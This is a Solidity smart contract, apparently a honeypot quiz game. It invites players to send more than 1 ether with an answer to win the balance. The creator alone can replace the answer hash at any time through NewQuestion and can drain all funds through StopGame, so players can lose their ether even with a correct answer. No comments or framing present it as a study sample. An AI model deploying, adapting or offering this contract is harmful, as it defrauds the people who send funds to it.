1 pragma solidity ^0.4.20;
2 
3 contract CONUNDRUM
4 {
5 
6     string public question;
7  
8     address questionSender;
9   
10     bytes32 responseHash;
11  
12     function StartGame(string _question,string _response)
13     public
14     payable
15     {
16         if(responseHash==0x0)
17         {
18             responseHash = keccak256(_response);
19             question = _question;
20             questionSender = msg.sender;
21         }
22     }
23     
24     function Play(string _response)
25     external
26     payable
27     {
28         require(msg.sender == tx.origin);
29         if(responseHash == keccak256(_response) && msg.value>1 ether)
30         {
31             msg.sender.transfer(this.balance);
32         }
33     }
34     
35     function StopGame()
36     public
37     payable
38     {
39        require(msg.sender==questionSender);
40        msg.sender.transfer(this.balance);
41     }
42     
43     function NewQuestion(string _question, bytes32 _responseHash)
44     public
45     payable
46     {
47         require(msg.sender==questionSender);
48         question = _question;
49         responseHash = _responseHash;
50     }
51     
52     function() public payable{}
53     
54 }